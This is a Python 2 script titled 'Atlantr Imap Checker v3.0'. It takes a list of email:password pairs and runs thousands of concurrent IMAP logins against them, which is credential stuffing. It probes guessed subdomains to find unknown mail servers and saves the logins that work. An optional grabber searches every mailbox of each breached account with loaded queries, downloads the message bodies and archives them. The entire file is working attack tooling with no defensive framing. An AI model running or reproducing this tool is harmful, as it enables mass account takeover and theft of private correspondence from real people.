#!/usr/bin/python
#- * -coding: utf-8 - * -

# Author: sup3ria
# Version: 3.0
# Python Version: 2.7

import sys
import os
import time
from timeit import default_timer as timer
import imaplib
import itertools
import argparse
import random
import signal
import operator
import socket
import compiler
import email
import StringIO
import os
import errno
import shutil

import gevent  # pip install gevent
from gevent.queue import *
from gevent.event import Event
import gevent.monkey

def sub_worker(t):
    if evt.is_set(): #TODO: dirty!
        send_sentinals()
        return
    q_status.put(t[1])#send status
    task = t[0].split(':')
    #-----------------------------------
    host = get_imapConfig(task[0])
    if host == False:
        if scan_unknow_host == True:
            host[0] = ini_uh(task[0])
        if host == False:
            if invunma == True:
                q_unmatched.put(t[0])#send unmatched to q
            return 
    #-----------------------------------
    l = imap(task[0], task[1], host)
    if l == 'OK':
        q_valid.put(t[0])#send valid to q
        q_status.put("VeryTrue")#put True in q for progressbar
        print True, t[0]
        #.........................
        if grabactiv:
            task = grabberwrap(task,host)
    #----------------------------------
    if l == False:
        if invunma == True:
            print False, t[0]
            q_invalid.put(t[0])#send to write to disk
        return

#main consumer thread
def worker(worker_id):
    try:
        while not evt.is_set():
                t = q.get(block=True, timeout=2)
                sub_worker(t)
        send_sentinals()
    except:
        send_sentinals()#TODO: Not sure how to exit here

#-----------------WRAPPERS-------------------------#

#Gets message and forwards to queue
def grabberwrap(task,host):
    for q in loaded_matchers:
        try:
            e = email_grabber(task[0],task[1],host,q)
            if len(e) >0:
                #print "Found",len(e),"messages."
                #TODO: Implement Progressbar counter
                for mail in e:
                    q_grabbed.put((task,str(mail)))
        except:
            pass
                
            

#/-----------------WRAPPERS-------------------------#

#-----------------IMAP-------------------------#

#login via imap_ssl, uses imap query on all inboxes, returns emails
def email_grabber(a, b,host,q):
        if len(host)<2:
            port = 993
        else:
            port = int(host[1])
        socket.setdefaulttimeout(time_out)
        quer = q.split('|')[0].strip()
        query = q.split('|')[1].strip()
        mail = imaplib.IMAP4_SSL(host[0], port)
        mail.login(a, b)
        rv, mailbox = mail.list()
        messages = []
        #TODO: Implement more stable filter for parsing mailboxes
        try:
            inboxes = [box.split(' ')[-1].replace('"','') for box in mailbox 
                        if box.split(' ')[-1].replace('"','')[0].isalpha()]
        except:
            return [] #TODO: Weak errorhandling
        if len(inboxes)<1:
            for i in mailbox:
                print i
        for inbox in inboxes[::-1]:
            try:
                #print inbox
                rv, data = mail.select(inbox)
                if rv == 'OK':
                    result, data = mail.uid(quer, None, query)
                    #if grabb_all == False:
                        #TODO: Implement parameter support for number of mails
                        #latest_email_uid = latest_email_uid[::-1][:3]
                        # search and return uids instead
                    i = len(data[0].split()) # data[0] is a space separate string
                    for x in range(i):
                        uids = data[0].split()[x] # unique ids wrt label selected
                        result, email_data = mail.uid('fetch', uids, '(RFC822)')
                        raw_email = email_data[0][1]
                        raw_email_string = raw_email.decode('utf-8')
                        # converts byte literal to string removing b''
                        email_message = email.message_from_string(raw_email_string)
                        # this will loop through all the available multiparts in mail
                        for part in email_message.walk():
                         if part.get_content_type() == "text/plain": # ignore attachments/html
                          body = part.get_payload(decode=True)
                          messages.append(str(body))
                         else:
                          continue
            except:
                pass
        return messages

#log in via imap_ssl, gives back true if valid
def imap(usr, pw, host):
    socket.setdefaulttimeout(time_out)
    usr = usr.lower()
    try:
        if len(host)<2:
            port = 993
        else:
            port = int(host[1])
        mail = imaplib.IMAP4_SSL(str(host[0]), port)
        a = str(mail.login(usr, pw))
        return a[2: 4]
    except imaplib.IMAP4.error:
        return False
    except:
        return "Error"

#/-----------------IMAP-------------------------#


#------GETUNKNOWN--HOST--------------------------#
def getunknown_imap(subb):
    socket.setdefaulttimeout(time_out)
    try:
        #TODO: Change to dynamic matchers
        sub = [
            'imap',
            'mail',
            'pop',
            'pop3',
            'imap-mail',
            'inbound',
            'mx',
            'imaps',
            'smtp',
            'm']
        for host in sub:
            host = host + '.' + subb
            try:
                mail = imaplib.IMAP4_SSL(str(host))
                a = str(mail.login('test', 'test'))
            except imaplib.IMAP4.error:
                return host
    except:
        return None

def ini_uh(host):
    try:
        host = host.split('@')[1]
        v = getunknown_imap(host)
        if v != None:
            with open("hoster.dat", "a") as myfile:
                myfile.write('\n' + host + ':' + v + ":993")
                ImapConfig[host] = v
            return v
        return False
    except:
        return False

#/------GETUNKNOWN--HOST--------------------------#

#---------------HELPERS-------------------------#

def make_sure_path_exists(path):
    try:
        os.makedirs(path)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise
            
#gets imap setting from dic
def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return ImapConfig[hoster]
    except:
        return False
        
#send sentinal values to writer queues
def send_sentinals():
    q_status.put("SENTINAL")
    q_valid.put("SENTINAL")
    if invunma:
        q_invalid.put("SENTINAL")
        q_unmatched.put("SENTINAL")
    if grabactiv:
        q_grabbed.put("SENTINAL")

#set event to trigger sential sending
def handler(signum, frame):
    print "\n[INFO]Shutting down gracefully (takes a while)"
    evt.set()

#read in blocks for better speed
def blocks(files, size=65536):
    while True:
        b = files.read(size)
        if not b: break
        yield b
        
def transform(expression):
    if isinstance(expression, compiler.transformer.Expression):
        return transform(expression.node)
    elif isinstance(expression, compiler.transformer.Tuple):
        return tuple(transform(item) for item in expression.nodes)
    elif isinstance(expression, compiler.transformer.Const):
        return expression.value
    elif isinstance(expression, compiler.transformer.Name):
        return None if expression.name == 'NIL' else expression.name

#get last line value from file generated when shutting down
def get_lastline():
    try:
        with open("last_line.log", "r") as text_file:
            for line in text_file:
                if int(line.strip()) < 1:
                    return 0
                else:
                    return int(line.strip())
                    return int(line.strip())
            return 0
    except:
        return 0

#/---------------HELPERS-------------------------#

#-----------LOADERS------------------------------#

#loading lines from file, putting them into q
def loader():
    try:
        global par1
        par1 = 0
        if resumer == True:
            par1 = get_lastline()
        with open(file_in, "r") as text_file:
            pid = par1
            for line in itertools.islice(text_file, par1, None):
                if len(line.strip()) > 1 and ':' in line.strip():
                    q.put((line.strip(), pid))
                    pid = pid + 1
    except IOError:
        print "[ERROR]No input file", file_in, "found!"
    except:
        pass
        
                    
#load imap queries from file #Yes, its racy and nobody cares ;-)
def init_matchers():
    global loaded_matchers
    loaded_matchers = []
    try:
        with open(file_match, "r") as text_file:
            loaded_matchers = [line.strip() for line in text_file
                    if len(line.strip()) > 1]
            if len(loaded_matchers)<1:
                print "No matchers in",file_match
                grabactiv = False

    except:
        print "[ERROR] Could not load any matchers, no file provided."

#load Imap settings from file
def init_ImapConfig():
    global ImapConfig
    ImapConfig = {}
    try:
        with open("hoster.dat", "r") as f:
            for line in f:
                if len(line) > 1:
                    hoster = line.strip().split(':')
                    ImapConfig[hoster[0]] = (hoster[1],hoster[2])
    except:
        print "[ERROR]hoster.dat", "not found!"

#/-----------LOADERS------------------------------#

#---------------WRITERS---------------------------#

#writing valid lines to disk
def writer_valid():
    try:
        with open(file_out, "a") as f:
            sen_count = workers
            while True:
                t =  q_valid.get(block=True)
                if t == "SENTINAL":
                    sen_count -= 1
                    if sen_count<1:
                        break
                else:
                    f.write(str(t)+"\n")
    except:
        pass

#writing invalid lines to disk
def writer_invalid():
    if invunma:
        try:
            with open(file_in[:-4] + "_invalid.txt", "a") as f:
                sen_count = workers
                while True:
                    t = q_invalid.get(block=True)
                    if t == "SENTINAL":
                        sen_count -= 1
                        if sen_count<1:
                            break
                    else:
                        f.write(str(t)+"\n")
        except:
            pass

#writing unmachted lines to disk
def writer_unmatched():
    if invunma:
        try:
            with open(file_in[:-4] + "_unmatched.txt", "a") as f:
                sen_count = workers
                while True:
                    t = q_unmatched.get(block=True)
                    if t == "SENTINAL":
                        sen_count -= 1
                        if sen_count<1:
                            break
                    else:
                        f.write(str(t)+"\n")
        except:
            pass

#writing grabbed emails to disk
def writer_grabber():
    if grabactiv:
        try:
            sen_count = workers
            make_sure_path_exists("grabbed")
            while True:
                t = q_grabbed.get(block=True)
                if t == "SENTINAL":
                    sen_count -= 1
                    if sen_count<1:
                        break
                else:
                    with open("grabbed/"+file_in[:-4] + "_grabbed_"+str(t[0])+".txt", "a") as f:
                        f.write(str(t[1])+"\n##349494END23534##\n")
                    #TODO: Change hardcoded seperation key
        except:
            pass

#writing last line to file
def state():
    sen_count = workers
    LastValue = {}
    while True:
        t = q_status.get(block=True)
        if t == "SENTINAL":
            sen_count -= 1
            if sen_count<1:
                try:
                    v = str(int(max(LastValue.iteritems(), key=lambda x:x[1])[1])+1)
                except:
                    break
                with open("last_line.log", "w") as f:
                    f.write(v)
                break
        else:
            if t != "VeryTrue":
                LastValue[t] = t

#/---------------WRITERS---------------------------#


#gevent async logic, spawning consumer greenlets
def asynchronous():
    threads = []
    threads.append(gevent.spawn(loader))
    for i in xrange(0, workers):
        threads.append(gevent.spawn(worker, i))
    threads.append(gevent.spawn(writer_valid))
    threads.append(gevent.spawn(state))
    if invunma:
        threads.append(gevent.spawn(writer_invalid))
        threads.append(gevent.spawn(writer_unmatched))
    if grabactiv:
        threads.append(gevent.spawn(writer_grabber))
    start = timer()
    gevent.joinall(threads)
    end = timer()
    if grabactiv:
	    if snap_shot:
	        output_filename = "grabbed_"+time.strftime("%Y%m%d-%H%M%S")
	        shutil.make_archive(output_filename, 'zip', "grabbed")
    print "[INFO]Time elapsed: " + str(end - start)[:5], "seconds."
    print "[INFO] Done."
    evt.set()#cleaning up

print """
       db              88
      d88b       ,d    88                         ,d
     d8'`8b      88    88                         88
    d8'  `8b   MM88MMM 88 ,adPPYYba, 8b,dPPYba, MM88MMM 8b,dPPYba,
   d8YaaaaY8b    88    88 ""     `Y8 88P'   `"8a  88    88P'   "Y8
  d8""""""""8b   88    88 ,adPPPPP88 88       88  88    88
 d8'        `8b  88,   88 88,    ,88 88       88  88,   88
d8'          `8b "Y888 88 `"8bbdP"Y8 88       88  "Y888 88
     Imap checker v3.0                          by sup3ria
"""
parser = argparse.ArgumentParser(description='Atlantr Imap Checker v3.0')
parser.add_argument(
    '-i',
    '--input',
    help="Inputfile",
    required=False,
    type=str,
    default="mail_pass.txt")
parser.add_argument(
    '-o',
    '--output',
    help='Outputfile',
    required=False,
    type=str,
    default="mail_pass_valid.txt")
parser.add_argument(
    '-t',
    '--threads',
    help='Number of Greenlets spawned',
    required=False,
    type=int,
    default="100")
parser.add_argument(
    '-iu',
    '--invunma',
    help='Log invalid an unmatched accounts.',
    required=False,
    type=bool,
    default=True)
parser.add_argument(
    '-g',
    '--grabber',
    help='Grab for matchers.',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-ga',
    '--grabball',
    help='Grabball emails',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-mf',
    '--matchfile',
    help='File with matchers..',
    required=False,
    type=str,
    default="matchers.dat")
parser.add_argument(
    '-to',
    '--timeout',
    help='timeout in sec',
    required=False,
    type=float,
    default="5")
parser.add_argument(
    '-r',
    '--resume',
    help='Resume from last line?',
    required=False,
    type=bool,
    default=False)
#Progressbar will be initialized by counting \n in a file,
#if file to big its too costly to count, hence disable when needed
parser.add_argument(
    '-b',
    '--big',
    help='Performance mode for big files',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-uh',
    '--unknownhosts',
    help='Check for unknown hosts',
    required=False,
    type=bool,
    default=True)
parser.add_argument(
    '-s',
    '--snap',
    help='Snapshots "Grabbed" folder as zip.',
    required=False,
    type=bool,
    default=True)
    
#parsing arguments
args = vars(parser.parse_args())

file_in = args['input']
file_out = args['output']
workers = args['threads']
invunma = args['invunma']
grabactiv = args['grabber']
file_match = args['matchfile']
time_out = args['timeout']
resumer = args['resume']
p_mode = args['big']
scan_unknow_host = args["unknownhosts"]
grabb_all = args["grabball"]
snap_shot = args["snap"]

#monkey patching libs which a supported by gevent
gevent.monkey.patch_all()

#registering an event and signal handler
evt = Event()
signal.signal(signal.SIGINT, handler)

#init ressources
init_ImapConfig()
if grabactiv:
    init_matchers()

#init of queues
q = gevent.queue.Queue(maxsize=50000) #loader
q_valid = gevent.queue.Queue()#valid
q_status = gevent.queue.Queue()#status
if invunma:
    q_invalid = gevent.queue.Queue()#invalid
    q_unmatched = gevent.queue.Queue()#unmatched
if grabactiv:
    q_grabbed = gevent.queue.Queue()#grabbed
#starting main logic
asynchronous()
